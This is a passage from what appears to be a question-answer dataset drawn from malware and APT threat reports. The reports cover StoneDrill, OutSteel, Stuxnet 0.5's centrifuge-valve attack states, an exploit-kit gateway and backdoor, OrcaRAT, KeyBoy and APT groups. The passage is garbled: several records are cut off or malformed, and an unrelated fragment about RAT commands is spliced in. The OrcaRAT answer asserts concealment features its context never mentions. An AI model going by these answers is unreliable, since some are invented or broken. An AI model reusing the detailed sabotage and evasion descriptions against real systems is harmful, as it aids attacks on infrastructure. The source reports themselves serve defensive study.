a flashy, come-and-go high impact tool.\nIn terms of attribution, while Shamoon embeds Arabic-Yemen resource language sections, StoneDrill embeds mostly Persian resource language sections. Geopolitical analysts would be quick to point out that Iran and Yemen are both players in the Iran-Saudi Arabia . Of course, we do not exclude the possibility of false flags.\nFinally, many unanswered question remain in regards to StoneDrill and NewsBeef. The discovery of the StoneDrill wiper in Europe is a significant sign that the group is expanding its destructive attacks outside the Middle East. The target for the attack appears to be a large corporation with a wide area of activity in the petro-chemical sector, with no apparent connection or interest in Saudi Arabia.\nAs usual, we will continue to monitor the Shamoon, StoneDrill and NewsBeef attacks. A presentation about StoneDrill will be given at the Kaspersky Security Analyst Summit Conference, on April 2-6, 2017.\nQ: How does StoneDrill differ from Shamoon in terms of payload injection and string encryption techniques? Why might these differences be significant for evading detection?",
    "output": "StoneDrill differs from Shamoon in several ways regarding payload injection and string encryption. StoneDrill injects its payload into the user's preferred browser process, whereas Shamoon uses a disk driver for direct access. Additionally, StoneDrill uses alphabet table replacement for string encryption, while Shamoon employs methods like ROR, NEG, ADD, or simple XOR. These differences are significant because they make StoneDrill more advanced in evading detection by emulators and sandboxing tools. The use of memory injection and sophisticated encryption techniques helps StoneDrill to avoid being easily detected and analyzed, making it harder for security systems to identify and mitigate its destructive activities.",

    "instruction": "Big Headline: Executive Summary\nThe OutSteel tool is a simple document stealer. It searches for potentially sensitive documents based on their file type and uploads the files to a remote server. The use of OutSteel may suggest that this threat group's primary goals involve data collection on government organizations and companies involved with critical infrastructure. The SaintBot tool is a downloader that allows the threat actors to download and run additional tools on the infected system. SaintBot provides the actors persistent access to the system while granting the ability to further their capabilities.\nWhile the OutSteel and SaintBot payloads were common among the attacks, the actors used different social engineering themes and infection chains to compromise systems. The actors used current events and other pertinent themes to trick recipients into opening documents, clicking links, enabling malicious content or running executables directly to compromise their systems. Early attacks in March and April 2021 used cryptocurrency and COVID themes, while we observed the actors using law enforcement-related themes and fake resumes in the May-July 2021 and the February 2022 attacks. The use of law enforcement-related themes in attacks spanning several months suggests that the threat group favors this social engineering theme in the absence of a trending topic or current event.\nThe use of email as the attack vector remains the same in all attacks carried out by this threat group. While the spear phishing emails are a common component, each attack uses a slightly different infection chain to compromise the system. For instance, the actors have included links to Zip archives that contain malicious shortcuts (LNK) within the spear phishing emails, as well as attachments in the form of PDF documents, Word documents, JavaScript files and Control Panel File (CPL) executables. Even the Word documents attached to emails have used a variety of techniques, including malicious macros, embedded JavaScript and the exploitation of (<https://nvd.nist.gov/vuln/detail/CVE-2017-11882>)CVE-2017-11882 to install payloads onto the system. With the exception of the CPL executables, most of the delivery mechanisms rely on PowerShell scripts to download and execute code from remote servers.\nFor more comprehensive information about the Russia-Ukraine crisis, including an overview of known attacks and (<https://unit42.paloaltonetworks.com/preparing-for-cyber-impact-russia-ukraine-crisis/>)recommendations for how to protect against possible threats, please see our post, \"Against the Cyber Impact.\"\nPalo Alto Networks customers receive protections against the attacks described via products and services including Cortex XDR and the WildFire, Advanced URL Filtering and DNS Security security subscriptions for the Next-Generation Firewall.\nRelated Unit 42 Topics (<https://unit42.paloaltonetworks.com/preparing-for-cyber-impact-russia-ukraine-crisis/>)Russia-Ukraine Crisis Cyber Impact, (<https://unit42.paloaltonetworks.com/tag/phishing/>)Phishing\nBig Headline: Links to Prior Attacks\nmentioned that they track this activity using the moniker UAC-0056, while other organizations track this group with the names (<https://www.proofpoint.com/us/daily-ruleset-update-summary-20210511>)TA471,  and (<https://nsfocusglobal.com/apt-retrospection-lorec53-an-active-russian-hack-group-launched-phishing-attacks-against-georgian-government/>)Lorec53. Our research shows that these attacks have various overlaps with previous attack campaigns focused on other organizations in Ukraine and Georgia, as well as other nations' assets local to Ukraine. These overlaps involve the use of the SaintBot downloader, shared infrastructure and other common elements. Figure 3 shows a timeline of the known attacks related to this threat group, specifically, the day the spear phishing emails were sent and the subject line of each email.\nThe timeline shows several attacks between April and July 2021. There is then a gap of several months between the 2021 attacks and attacks that have been observed in 2022. This is more likely due to a lack of visibility rather than a pause in activity. We believe that the threat group did not pause their activity as we are aware of additional delivery documents and payloads that suggest additional attacks occurred during the apparently inactive periods on the timeline.\nDetails of known prior attacks associated with UAC-0056 are available in Appendix A. Attacks described in the appendix include:\nMarch 2021: An attack campaign against targets in Georgia using Bitcoin and COVID themes.\nApril 2021: Bitcoin-themed spear phishing emails targeting Ukrainian government organizations.\nMay 2021: Law enforcement-themed attacks targeting Ukrainian government organizations.\nJune 2021: Law-enforcement themed attack against a Ukrainian government organization\nJuly 2021: Spear phishing attempt on a Western government entity in Ukraine.\n\nAnswer this question based on the above context: How does the OutSteel tool operate, and what insights does its use provide about the threat group's objectives?",
    "output": "The OutSteel tool is a simple document stealer. It searches for potentially sensitive documents based on their file type and uploads the files to a remote server. The use of OutSteel may suggest that this threat group's primary goals involve data collection on government organizations and companies involved with critical infrastructure.

    "instruction": "Small Headline: Format 1\n\"####\": Decoded as two separate two-digit numbers representing the stage number and the centrifuge number within the stage, respectively. The stage number must be in the decimal range 1 to 15, which matches with the known Natanz configuration. For each of these 15 stages, the maximum number of expected centrifuges in each corresponding stage is looked up in the following array.\nThis means, for example, stage 3 is expected to have a second two digit number equal to 4 or less. This requirement is consistent with the centrifuge arrangement within a cascade.\nSmall Headline: Device type A\n\"##<delimiter><string>\": A two digit number in the range 1 to 3 with an optional string preceded by a delimiter character. The string must start with the letter S and contain the letter P. If the string is present, the device is modified to be device type 0xB instead (Flow Rate Transmitter Controller Output, rather than device type 0xA which is Flow Rate Transmitter Controller Input).\nBased on the symbol fingerprinting, the following table summarizes what devices and labels Stuxnet looks for within the symbol table.\nMedium Headline: Symbol address parsing\nEach symbol label will have two corresponding addresses:  -- the address in the process image area and the direct peripheral address of the device represented by the symbol. Modifying the memory at these addresses allows the PLC to control and read the behavior of the associated device. For example, the value may be a Boolean value turning a switch on or off, or a 16-bit value representing the current temperature of the system. Addresses can be either outputs (the PLC sets the value to modify the behavior of the device) or inputs (the PLC reads the value to determine the current state of the device).\nDevice types 0, 1, 5, and B must be output addresses and device types 2, 3, 4, 5, 6, 7, 8, 9, A, and C must be input addresses.\nValues at addresses for device types 0, 1, 2, 3, 4, and 5 must be bit values. Values at addresses for device types 6, 7, 8, 9, A, B, and C must be 16-bit values.\nMedium Headline: Cascade rating and building DB8061\nAfter parsing the symbols and addresses for each cascade, the code inspects the configuration of each cascade. Depending on the configuration, a rating is calculated. Certain devices in certain configurations will result in higher ratings. When complete, only the six highest-rated cascades have data written to DB8061.\nFinally, a flag is set signifying DB8061 has been built. This flag is reset to 0 every time the \"DOWNLOAD\" verb is executed.\nMedium Headline: PLC device attack code\nThe code conducts an attack by closing valves in the six top rated cascades out of the possible 18 cascades. The states of two types of valves are modified:\n\u2022 Centrifuge valves \u2013 a set of three valves (feed, product, tails) that work in unison per centrifuge to control uranium hexafluoride (UF6) flow into each centrifugeStage valves \u2013 one per stage to control UF6 flow into each stage\n\u2022 Auxiliary valves \u2013 valves that control UF6 flow into or out of each stage (stage valve) or the cascade as a whole\nFigure 2\nExample valve configuration showing both valve types in three stages of a cascade\nSimilar to version 1.x of Stuxnet, the PLC device attack code consists of a state machine with eight possible states:\nState 0 (Wait): Perform system identification and wait for the enrichment process to reach steady state before attack. This can take approximately 30 days.\nState 1 (Record): Take peripheral snapshots and build fake input blocks for replaying later.\nState 2 (Attack centrifuge valves): Begin replaying fake input signals. Close valves on most centrifuges.\nState 3 (Secondary pressure reading): Open both centrifuge and feed stage valves in the final stage of a single cascade to obtain a low pressure reading.\nState 4 (Wait for pressure change): Wait for desired pressure change or time limit. This can take up to approximately two hours.\nState 5 (Attack auxiliary valves): Open all auxiliary valves except valves believed to be near the first feed stage (stage 10). Wait for three minutes in this state.\nState 6 (Wait for attack completion): Wait for six minutes while preventing any state changes.\nState 7 (Finish): Reset and return to state zero.\nFigure 3\nState flow diagram of 417 PLC device attack code\nSmall Headline: State 0:\nThe code verifies the system has reached steady state by monitoring the state of each auxiliary valve and the amount of elapsed time.\n\u2022 The valves must not change state for a period of 300 snapshots. In addition, the code determines if most of the centrifuge valves are in the open or closed position.\n\u2022 All cascades must be operational for three or more days, or currently be in the down state.\n\u2022 At least one cascade must have been operating for more than 35 days, or collectively all cascades must have been operating for more than 297 days.\n\u2022 Between 3 and 7 of the first 21 auxiliary valves must have been opened in the last 2 days.\n\u2022 Most of the pressure readings associated with the auxiliary valves must be within an expected range.\nOnly if these all conditions are met does the code proceed to state 1.\nSmall Headline: State 2:\nFirst, the normal operating pressure is obtained and stored for replay later. For each stage a portion of all the centrifuge valves are closed, except in the feed stage (stage 10). The centrifuge valves in the feed stage remain completely open, while the centrifuge valves at both the product end and tails end are completely closed.\nThe particular centrifuge valves closed per stage are randomly chosen. The code will randomly chose a starting centrifuge valve and then close the next one in order until the last centrifuge valve in the stage. If the total desired number of valves to close for that stage has not been reached, the code will continue from the first centrifuge valve in the stage until the maximum valves to close are reached.\nSmall Headline: State 4:\nState 4 waits for the desired pressure change or other predetermined time limits before proceeding to state 5. If any of the following conditions are met, the code will continue to state 5:\n\u2022 The pressure of the stage 10 or stage 11 transducer (these are likely transducers for or near the feed stage) has an absolute value greater than 280 units above the expected value and greater than five times the expected value.\n\u2022 46 minutes after the state of an auxiliary valve has been modified from the original state recorded in state 1, with the exception of auxiliary valve number 17 which is likely a stage valve near the product end.\n\u2022 2 hours and 3 minutes after the attack started (since state 2) without any centrifuge valve state changes.\n\u2022 2 hours and 3 minutes since at least four centrifuge valve states have been modified from the original state recorded in state 1.\nSmall Headline: State 7:\nData is reset and the code returns to state 0.\nBy closing all valves except the initial feed stage valves, UF6 will continue to flow into the system.  This act alone may cause damage to the centrifuges themselves. However, the attack expects the pressure to reach five times the normal operating pressure. At this pressure, significant damage to the uranium enrichment system could occur and the UF6 gas could even revert to a solid.\nWhether the attack succeeded in this manner or not remains unclear. Even if the attack did succeed, the attackers decided to move to a different strategy in the Stuxnet 1.x versions, attacking the speed of the centrifuges instead.\nBig Headline: Conclusion\nStuxnet 0.5 clarifies the evolution and history of Stuxnet. Stuxnet clearly became more aggressive over time and switched development platforms as it evolved from 0.5 versions to later 1.x versions.\nKey parts of the 417 attack code missing from versions 1.x is fully implemented in Stuxnet 0.5. This demonstrates that the 417 attack code was the first attack strategy implemented by Stuxnet. This original 417 attack code attempted to modify valve states during the uranium enrichment process at Natanz, Iran, to cause damage to the centrifuges and the system as a whole.\nFigure 4\nLow-enriched uranium production (source ISIS)\nThe success of Stuxnet 0.5 remains unknown. However, the chart in figure 4 references uranium enrichment production at Natanz to key milestones of Stuxnet development. Interesting events are dips in feed or production amounts and lower levels of production given the same or greater feed amounts (shown as gaps between the two lines).\nWhile the discovery of Stuxnet 0.5 helps to deepen our overall understanding of Stuxnet and what its goals are, versions remain unrecovered. If these are located, they may expose other secrets behind this operation and more clues to its origins, but obtaining these other samples may prove to be next to impossible.\n\nQ: How does Stuxnet 0.5 parse and utilize symbol addresses to control and read the behavior of associated devices?",
    "output": "A: Stuxnet 0.5 parses symbol labels to find two corresponding addresses: the address in the process image area and the direct peripheral address of the device represented by the symbol. By modifying the memory at these addresses, the PLC can control and read the behavior of the associated device. Device types 0, 1, 5, and B must be output addresses, while device types 2, 3, 4, 5, 6, 7, 8, 9, A, and C must be input addresses.

    "instruction": "Medium Headline: Sample #5 \u2013 fdsvc.dll\nThe file fdsvc.dll is an encrypted file, successfully decrypted into a valid DLL (MD5: 889e320cf66520485e1a0475107d7419) by the aforementioned executable fdsvc.exe.\nOnce decrypted, it represents itself as a bot that accepts the C&C name and port number(s) as a string parameter that is used to call the DLL. The parameter is encoded with an XOR loop that includes XOR key cEzQfoPw.\nMultiple C&C servers can be delimited with the ' |' character and port numbers are delimited from the C&C servers with the ':' character.\nOnce the bot has established communication with the remote C&C, it uses several transliterated Russian words to either indicate the state of its communication or issue backdoor commands, such as:\nThe binary protocol is custom. For example, during the \"ustanavlivat\" (handshake) mode, the bot accepts 4 bytes, which are then decrypted. The decryption is a loop that involves multiple XOR operations performed over the received data. Once decrypted, the 4 bytes indicate the size of the next data chunk to be received.\nThe next received data chunk is also decrypted, and its contents checked to see whether it's one of the backdoor commands.\nFor example, the \"poluchit\" command instructs the bot to receive the file, and the \"pereslat\" (send) command instructs the bot to upload the file. The received \"poluchit\" command may also contain a URL, marked with another transliterated Russian word \"ssylka\" (link). In this case, the remote file is fetched in a separate thread. If a received data chunk contains the command \"vykhodit\", the bot quits its backdoor loop.\nThe bot implements the SSL/TLS protocol, and is based on a source code of \"Curl v7.49.1\". Hence, it is able to transfer files via HTTP, HTTPS, FTP, SMTP and many other protocols, with full support of user/password authentication (Basic, Digest, NTLM, Negotiate, Kerberos), proxies and SSL certificates.\nSmall Headline: Russian language used in fdsvc.dll\nIn spite of some 'Russian' words being used, it is evident that the malware author is not a native Russian speaker.\nOf our previous examples, five of the commands were likely produced by an online translation. Below we provide the examples and the correct analogues for reference:\nAnother example is \"kliyent2podklyuchit\". This is most likely a result of an online translation of \"client2connect\" (which means 'client-to-connect'). In this case, the two words \"client\" and \"connect\" were translated separately, then transliterated from the Russian pronunciation form into the Latin alphabet and finally joined to produce \"kliyent2podklyuchit\".\nSuch a result may look impressive to the bot's author, but would be difficult to understand for native Russian speakers.\nHere we provide an example of translating the word \"client\" in Russian - the word \"kliyent\" here only demonstrates phonetic pronunciation, not how it's actually written in a transliterated form. When formed using the Latin alphabet, it would actually be written \"client\" or \"klient\".\nDue to such inconsistencies, we conclude that the Russian language is likely used as a decoy tactic, in order to spoof the malware's country of origin.\nMedium Headline: Sample #6 \u2013 cambio.swf\nDuring the investigation of the watering-hole incident, the owner of a compromised website shared with us a malicious implant that was added into the site, presumably by using an exploit against JBoss 5.0.0.\nThe script is called view_jsp.java and is accessed from the watering-hole website as view.jsp.\nThis script is responsible for serving cambio.swf.\nThe infection starts from a primary web site being compromised so that its visitors are redirected into a secondary website, calling its view.jsp script from an added IFrame. The initial request contains parameter pagenum set to 1, such as:\n\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"\nThis begins the profiling and filtering to identify potential victims. For example, the script then checks to see if the\nclient's IP is black-listed. If so, such initial request is rejected.\nNext, the script checks if the client's IP is white-listed (i.e. targeted). If not white-listed, it is also rejected. Hence, unless the visitor's IP is on the attackers' list, the script will not attempt to infect their machine. This helps the infected websites stay undetected for relatively long period of time, as they only serve exploits to the selected targets.\nIn the next stage of the script, it builds and serves back to the client an HTML page with an embedded JavaScript that detects the type of client's browser (Internet Explorer, Google Chrome, Firefox, Safari, or Opera), OS version, and the loaded plugins, such as Adobe Flash and Microsoft Silverlight.\nThe script executed on a client side then builds a form, and submits it back to the gateway script, as shown below:\nThe submitted form specifies the pagenum parameter to be set to 2, to advance the script to the next step:\nOnce the script accepts the incoming request and finds the form's pagenum value is 2, it reads other fields from the submitted form and decides which exploit to serve back to the client.\nAt the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash and Microsoft Silverlight, though these could be expanded upon as needed.\nThe exploits can be individually enabled or disabled by the attackers with the standalone file config.dat. For example, to enable both exploits (flag=1), the contents of this file can be set to:\nwhere 2016-0034 identifies the Silverlight exploit, and 0000-0001 is the Flash exploit.\nIf the script detects that the submitted form contains a non-empty version of Silverlight browser plugin, it will generate and serve back a Silverlight exploit. If the submitted form has a non-empty version of Adobe Flash browser plugin, the script will generate and serve back the Flash exploit. If the client has both plugins loaded within the browser, then the script will serve the Flash exploit only.\nNOTE: the script only serves the Flash exploit if the browser is Internet Explorer.\nThe exploits are generated by the functions:\n\u2022 genExp_20160034() \u2013 to generate Silverlight exploit\nThe latter is explained in further detail below. First, the script builds URL string named as download_url:\nFor example, the URL string may look like:\nhttp://[WEB_SITE]/view.jsp?uid=30304811&pagenum=3&eid=00000002&s=2&data=\nNote that the pagenum parameter of the URL has now advanced to 3 (third step of the view.jsp execution).\nThis URL string will be embedded by the genExp_00000001() function into the body of the shellcode.\nThe output of the genExp_00000001() function is JavaScript that has the following format \u2013 this script will be executed inside the client's browser:\n01 var laskfji = 'PGh0bWw+..'; // long string here\nOnce the string s is base64-decoded by client-based JavaScript, it will look like a Flash object embedded into HTML:\n20 </body>\n21 </html>\nAs seen in the Flash object parameters, the SWF object is served from the website's path:\ninclude/cambio.swf\nHowever, the SWF object is also accompanied with 2 extra parameters:\nBy looking into the decompiled cambio.swf file, its ActionScript reveals that the SWF file indeed expects 2 parameters: Health and shell.\nThe value of Health is used as an XOR key to decode the binary blob orinBin, which is included in the SWF file. This blob is then loaded with loadBytes(), as shown below:\nBelow is the binary blob orinBin as seen within the SWF file:\nBy knowing the value of Health parameter, it is now possible to use it as an XOR key to decode the orinBin blob within the SWF code.\nOnce decrypted, the orinBin blob presents another SWF file. This time, it contains 3 encrypted blobs within: bin22, bin23, and bin24 seen below:\nThe code decrypts the blobs with RC4, using \"littleEndian\" as the RC4 key. These blobs also turn out to be SWF files that contain the SWF exploit code.\nInternally, the ActionScript also uses transliterated Russian words, similar to the tactic seen in the bot code:\nAs seen in the table, while the words are technically Russian, their usage is out-of-context.\nIn one code fragment, the ActionScript contains both \"chainik\" and \"dummy\":\nAs such, it is obvious that the word \"dummy\" has been translated into \"chainik\". However, the word \"chainik\" in Russian slang (with the literal meaning of \"a kettle\") is used to describe an unsophisticated person, a newbie; while, the word \"dummy\" in the exploit code is used to mean a \"placeholder\" or an \"empty\" data structure/argument.\nIn the same way, it is likely the word \"farm animals\" was originally used to represent \"a beast\". Yet, it has been translated into a word that is only synonymous to \"the beast\" in a certain context.\nAs a result, they have used the words \"farm animals\" across the shellcode instead of \"beast\"; which makes little sense.\nAs in the case of sample #5 ( fdsvc.dll), it is likely that this loose Russian translation, evidently performed by a non-Russian speaker, is intended to spoof the malware origin.\n\nWhat are the backdoor commands used by the bot in the fdsvc.dll file, and how are they implemented?",
    "output": "The bot in the fdsvc.dll file uses several transliterated Russian words to issue backdoor commands. For example, the 'poluchit' command instructs the bot to receive a file, and the 'pereslat' command instructs the bot to upload a file. The received 'poluchit' command may also contain a URL, marked with the transliterated Russian word 'ssylka' (link). In this case, the remote file is fetched in a separate thread. If a received data chunk contains the command 'vykhodit', the bot quits its backdoor loop.",

    "instruction": "OrcaRAT - A whale of a tale\nBy Dan Kelly and Tom Lancaster\nIt's every malware analyst's dream to be handed a sample which is, so far, unnamed by the AV community - especially when the malware in question may have links to a well-known APT group.\nIn my line of work I analyse several 'unknown' malware samples a week, but often it turns out that they are simply new variants of existing malware families. Recently I was fortunate enough to be handed something that not only had a low detection rate but, aside from heuristics, seemed to be relatively unknown to the top 40 anti-virus companies.\nIn this post I will walk you through the malware family we've dubbed \"OrcaRAT\".\nFirst of all, it is worth pointing out that most of the malware I see on a day-to-day basis is espionage orientated, and very rarely do the programmers and operators make much effort to cover their tracks. The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent.\nThe malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo[1] malware and happened across a malware sample (253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613) he didn't recognise. He immediately took the malware and passed it through first stage analysis, which involves running the file in a sandbox environment. After this, he handed it over for more in-depth capability analysis.\n\nAnswer this question based on the above context: How does the discovery of OrcaRAT differ from typical malware analysis processes, and what unique characteristics set it apart from commonly encountered malware?",
    "output": "The discovery of OrcaRAT stands out because it was initially unrecognized by the top 40 anti-virus companies, indicating a low detection rate and potential novelty. Unlike typical malware, which often consists of new variants of existing families, OrcaRAT appeared to be relatively unknown. This uniqueness was further highlighted by its association with infrastructure linked to Comfoo malware, suggesting potential ties to a well-known APT group. Additionally, while most espionage-oriented malware makes little effort to conceal its tracks, OrcaRAT exhibited characteristics that made it more challenging to detect and analyze, setting it apart from the usual malware encountered in day-to-day analysis.",

The data in this case is stored between the havexhavex tags, it is then decrypted and decoded (base64).\nThe RAT supports 13 commands including:\n\u00b7 Screen capture\n\u00b7 Trojan Update\n\u00b7 Loading DLLs\n\u00b7 Starting executables\n\u00b7 Running shell commands\n\u00b7 Listing directories\nEach time a command (task) is executed, the result of that command is stored in the registry under a subkey named \u2022done\u2022 or \u2022doneEXT\u2022.\nThe results (which are called \u2022answers\u2022 by the authors) are then POSTED to the C&C server.\nThe ClientX backdoor is analyzed in depth in Appendix 5.\nVery Small Headline: 1.

    "instruction": "Answer based on context:\n\nBig Headline: Part 2: KeyBoy \u2013 Tracking Evolution\nPeriodic updates are common in the world of software development. Features are added and removed, bugs are patched, and code is written to execute more efficiently. The same holds true for malicious software, but with the additional requirement that the development cycle must always satisfy the operational need for covertness. To be effective, malicious software designed for surveillance must remain undetected. Malware developers are in a constant struggle to avoid the security controls that protect target systems.\nWe believe the 2013, 2015, and 2016 KeyBoy samples provide evidence of a development effort focused on changing components that would be used by researchers to develop detection signatures. This section outlines how we came to this conclusion.\nIn building our KeyBoy chronology, we collected several samples and examined three data points from each:\nThe compile time of the KeyBoy binary\nA string observed in the KeyBoy binary we refer to as the 'version identifier'\nElapsed time between compile time and the time of first exposure\nAnalysis of these data points gave us a moderate to high level of confidence that the binary compile times provided a reliable estimate of the true development timeline.\nMedium Headline: An Evolving Implant\nIn an effort to understand its evolution, we compared the code of several versions of KeyBoy as identified by their 'version identifier' strings, shown in Table 4:\nThe 'version identifier' is a particular string that appeared in every KeyBoy sample we studied. It is transmitted to the command and control server as part of the login data packet, and, in recent versions, this identifier is written to the Windows registry in a key named 'Ver'. With the exception of the newest (chronologically speaking) KeyBoy version we discovered, this identifier always contained a date-like component which matched the compile date of the\nKeyBoy binary in every case. In the newest sample, the developers replaced this date-like string with a seemingly random set of letters.\nA timeline depicting these KeyBoy versions, along with some important characteristics, is shown in Figure 5.\nSmall Headline: Header Code Evolution\nOf the changes we identified one stands out as being an immediate target for an effective antivirus signature \u2013 the evolution of header codes used during communication between the implant and command and control server. As shown in Table 5, these codes changed substantially after the 2013 KeyBoy samples were examined and publically documented by Rapid7. It is reasonable to hypothesize that this significant change in format was in response to the publication of Rapid7's research.\nIn addition, modifying these codes produced a downstream change in the appearance of the network communication traffic produced by an active KeyBoy infection. This change would likely have rendered existing network based signatures ineffective.\nSmall Headline: Configuration File Changes\nAnother major change we first observed in version P_20150313 is the complete redesign of the algorithm used to encode the KeyBoy configuration file. In the 2013 samples described by Rapid7, this configuration file was encoded using a simplified static-key based algorithm. This newer encoding algorithm is significantly more involved, removing the use of a static encryption key in favour of a dynamically constructed lookup table. We provide a detailed explanation of this new algorithm in Appendix A.\nSmall Headline: Persistence Changes\nThe method used by the implant for maintaining persistence was also changed several times. The earlier versions used a Windows service to ensure the malware stayed persistent, moving to a more commonly seen tactic of setting the Run key in the Windows registry in the early 2015 sample. This method changed again in late 2015 when the implant migrated from the Run key to using a less frequently observed registry key: Winlogon\\Shell. This key stores the list of executables which are to be run once a Windows GUI session is created, and typically holds only the standard user shell, explorer.exe.\nSmall Headline: String Obfuscation\nIn another modification, first observed in the most recent October 11 Parliamentarian operation (version agewkassif), the developer(s) of KeyBoy began using a string obfuscation routine in order to hide many of the critical values referenced within the malware. This introduction of string obfuscation also suggests a development change aimed at evading detection. The header codes, filename references, and all of the operator commands were obfuscated and only decoded during execution of the KeyBoy DLL. Figure 6 shows a sampling of these strings, after decoding.\nSmall Headline: Evidence of Modularity\nFinally, there were numerous changes observed that could suggest that KeyBoy was being deployed using a modular or component based mechanism. The GetUp export which is linked to the browser credential theft capability seems to be present in some samples and not others, even for versions within the same development stage. As well, the inconsistent use of a dropper binary during infection is further evidence supporting the modular component theory.\nSmall Headline: Additional Details\nBeyond the main modifications outlined above, numerous smaller changes were also observed, many of which are described in Table 6 below.\nagewkassif\nFunctionally identical to 20160509 sample\nContinues use of new config encoding algorithm\nRemoved date string from version identifier\nAdded static string obfuscation code. Strings used for C2 commands, header codes, and more are now decoded at runtime\nTable 6: Changes observed between successive versions of KeyBoy\nAdditional technical details relating to several of the KeyBoy samples described in this section are provided in Appendix B.\nMedium Headline: Connecting KeyBoy to Other Operations\nIn their Operation Tropic Trooper (<http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp-operation-tropic-trooper.pdf>)report, Trend Micro documented the behaviour and functionality of an espionage toolkit with several design similarities to those observed in the various components of KeyBoy. Trend Micro specifically noted that the 2013 versions of KeyBoy used the same algorithm for encoding their configuration files as was observed in the Operation Tropic Trooper malware.\nThis connection may offer another explanation for the significant change in the configuration file encoding algorithm we described in relation to KeyBoy. If KeyBoy is a single component of a larger espionage toolkit, the developers may have realized that this older, static-key based, configuration encoding algorithm was inadvertently providing a link between disparate components of their malware suite.\nBig Headline: Recent Tibetan Protests\nThe harm of malware operations against the Tibetan community is (<https://targetedthreats.net/>)well-documented, and this latest campaign is no exception. Examining the lure content sent to the Tibetan Parliamentarians sheds light on the oppression faced by the Tibetan community. On October 19, over 180 Tibetan groups protested the ongoing demolitions of the Larung Gar Buddhist Academy, the largest Tibetan Buddhist institute in the world.\nThe demolitions stem from an order issued by Chinese authorities in June 2016, (<https://freetibet.org/news-media/na/over-180-tibet-groups-condemn-larung-gar-demolitions-joint-statement>)according to a joint statement issued by Tibet groups on the date of protest. According to the same joint statement, the order from Chinese authorities said the community was in need of \"ideological guidance\" from the Chinese state. In conjunction with the (<http://tchrd.org/nuns-continue-suicide-protest-against-demolition-of-buddhist-institute/>)demolitions, residents are being forcefully removed from Larung Gar. To date, the forced removals have led to to the suicide of three resident nuns.\nThe Communist Party of China views the Tibetan movement as a threat to its rule, alongside Uyghur, Falun Gong, advocates for an independent Taiwan and Hong Kong, and members of the democracy movement. Surveilling the highest governing body of the Central Tibetan Administration aligns with the overall interests of the government of China. However, connecting the malware development ecosystem and the flow of stolen information to a state-actor\nis an elusive task. With the data available we are unable to conclusively connect the Parliamentarian Operation to any specific actor or nation-state.\n\nHow did the developers of KeyBoy adapt their malware to evade detection by antivirus software, particularly focusing on the changes made to the header codes?",
    "output": "The developers of KeyBoy adapted their malware to evade detection by making significant changes to the header codes used during communication between the implant and the command and control server.

    "instruction": "Big Headline: Introduction:\nEvery system connected to the internet in every home, organization, and government entity is relentlessly subject to the attempts of malicious actors to steal their data or exploit their system. Cyber-attacks are prevalent in the digital age because computers (including mobile devices) are ubiquitous in society, because identification of an attacker and attribution is difficult, and because judicial rulings for cyber-crimes are nebulous. Most cyber-attacks are ` by basic security measures such as firewalls and antivirus applications. However, an elite percentile of the sea of cyber attackers is more persistent, more resourceful, and more sophisticated than the rest. These elite factions are known as Advanced Persistent Threats, and basic security measures are not enough to stop them from compromising some of the best-secured systems around the world.\nGlobally, at least a hundred advanced persistent threat groups are currently operational as criminal operations, mercenary groups, or nation-state sponsored divisions. Criminal operations typically target organizations or individuals for financial data or personal identifiable information for identity theft. Mercenary groups steal financial information or specific information from specific targets, as requested by their client. State sponsored groups may target organizations or governments to steal financial information, defense information, information that would grant a geopolitical economic or technological advantage, or any information that would be of use in intelligence or counterintelligence operations.\nNation state actors have been known to compromise enemy systems in order to plant malicious code that could enable the attacker to fully control the target networks or sabotage the systems altogether. While only limited application has been seen in the 2008 conflict between Russia and Georgia, the possibility of a joint cyber-physical war exists. An invading force can gain significant advantage over its enemy if it cripples their critical infrastructure prior to the attack. State actors such as Russia have entwined themselves within the networks of our Nation's critical infrastructure for surveillance purposes as they watch and wait for the appropriate time to cash in on their strategic positions.\nAttribution of attacks is difficult. Researchers learn to think like attackers and to retrace the steps of a campaign. Security firms identify advanced persistent groups according to their tools, techniques, and characteristics. Advanced groups tend to develop and update their own sets of tools and malware. The keyboard language settings that remain in the code or the file names can reveal the attackers' nationality. Strings left in the code can reveal aspects of the development environment and the available resources. Who the group targets or does not target (especially in the case of nation state actors) can reveal the agenda of the\nadversary. The infrastructure, domain, and network of attackers can reveal their location, resources, and sophistication. Finally, the specific information stolen and whether that data is sold, used, or stored can also assist in profiling an adversary.\nCyber-attacks deal significant damage to nations and citizens alike in the form of breaches and compromised systems. Most of the time, the adversary is an unknown phantom menace and security professionals analyze forensic data to attribute the crime to a specific actor. This primer aims to pull the veil from prominent actors and to assist in attribution attempts. This primer offers an introductory view of some of the most prolific advanced persistent threat groups in recent history. It also intends to give a top level view of the threat landscape and attack process. This primer is not a sole source of attribution information. Old actors falter about as quickly as new, identified groups emerge. Further, new groups often develop from or mimic their predecessors. It would be erroneous to rely upon a static document for attribution purposes. This primer cannot provide the whole view of an actor. Each actor is an extremely complex group. Even security firms rarely possess complete knowledge of an active adversary. Different firms identify different portions of actors and refer to them with different names. Malware can be copied or purchased by a new adversary. The adversaries update their malware and exploit kits, along with their attack vectors in order to stay ahead of detection efforts. Finally, different organizations and governments evaluate and fear APT groups differently. As a result, this primer will not serve as a ranking system just as it does not serve as a comprehensive list of all attackers. Instead, the information below is offered to raise awareness about the groups that populate the cyber landscape. We have categorized these APT groups by country so that the reader can more easily identify the characteristic similarities of the attack components.\n\nQ: How do Advanced Persistent Threats (APTs) differ from typical cyber-attacks in terms of their persistence, resources, and sophistication? Why are basic security measures insufficient against APTs?",

Unlike common cyber-attacks, which can often be thwarted by basic security measures such as firewalls and antivirus applications, APTs are carried out by an elite percentile of attackers who are more persistent, resourceful, and sophisticated. These attackers are capable of compromising even the best-secured systems globally. Basic security measures are insufficient against APTs because these attackers develop and update their own sets of tools and malware, making them harder to detect and mitigate.",

